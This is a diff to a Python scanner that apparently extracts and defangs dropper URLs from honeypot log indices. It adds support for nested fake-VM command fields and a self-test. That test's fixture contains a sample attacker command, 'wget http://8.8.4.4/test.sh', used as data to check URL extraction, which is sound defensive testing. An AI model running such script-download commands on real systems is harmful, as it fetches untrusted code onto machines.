@@ -26,8 +26,8 @@ import re
 import sys
 import urllib.parse
 
-INDICES = "tripwire-sentinel-*,tripwire-hits-*"
-FIELDS = ("http_body", "payload_text", "http_requests", "body_excerpt", "path")
+INDICES = "tripwire-sentinel-*,tripwire-hits-*,tripwire-fakevm-*"
+FIELDS = ("http_body", "payload_text", "http_requests", "body_excerpt", "path", "fakevm.command")
 BOOK = "dropper-book"
 LOOKBACK = "now-3d"
 BATCH = 200
@@ -248,7 +248,9 @@ def ensure_book(client):
 def join_fields(src):
     parts = []
     for field in FIELDS:
-        value = src.get(field)
+        value = src
+        for key in field.split("."):
+            value = value.get(key) if isinstance(value, dict) else None
         if isinstance(value, list):
             parts.append("\n".join(str(v) for v in value))
         elif value:
@@ -415,6 +417,16 @@ def selftest():
     # 10
     assert defang("http://evil.example.com:8080/a.sh") == \
         "hxxp://evil[.]example[.]com:8080/a.sh"
+
+    # Nested fake-VM command text follows the same extraction/update path.
+    fakevm_hit = {"_index": "tripwire-fakevm-000001", "_id": "test-fakevm",
+                  "_source": {"fakevm": {"command": "wget http://8.8.4.4/test.sh"},
+                              "source": {"ip": "8.8.4.4"}, "@timestamp": "2026-09-19T00:00:00Z"}}
+    fakevm_client = FakeClient([fakevm_hit])
+    assert scan(fakevm_client) == 1
+    fakevm_updates = [c for c in fakevm_client.calls if "/_update/" in c[1]]
+    assert fakevm_updates[0][2]["doc"]["dropper"]["urls"] == ["http://8.8.4.4/test.sh"]
+    assert join_fields({"fakevm": "invalid"}) == ""
 
     # 11: success path, two hits, only the first has a body worth extracting
     hits = [
